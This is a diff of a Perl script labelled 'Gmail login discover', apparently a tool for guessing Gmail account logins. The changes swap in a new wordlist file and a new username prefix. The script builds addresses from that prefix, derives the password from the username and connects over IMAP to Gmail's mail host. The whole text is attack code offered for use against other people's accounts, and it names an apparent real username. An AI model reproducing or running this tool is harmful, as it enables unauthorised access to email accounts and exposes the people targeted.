@@ -13,7 +13,7 @@ init(1);
 system("pause");
 
 sub banner {
-$wordlist = "83_tim_3". ".txt";
+$wordlist = "MyOwnDictionary.txt";
 open (LIST, $wordlist) || die "\n[-] No Wordlist On $wordlist -_- \n";
 print "Gmail login discover - by xandin69\n\n";
 }
@@ -53,9 +53,9 @@ use Net::IMAP::Simple;
 use Email::Simple;
 use IO::Socket::SSL;
 		# fill in your details here
-		my $username = "ygoroliveira" . shift . '@gmail.com';
+		my $username = "ARNOLDSCHWASNEGER" . shift . '@gmail.com';
 		my $password = $username;
-		$password =~ s/ygoroliveira//ig;
+		$password =~ s/ARNOLDSCHWASNEGER//ig;
 		my $mailhost = 'pop.gmail.com';
 		# Connect
 		my $imap = Net::IMAP::Simple->new(
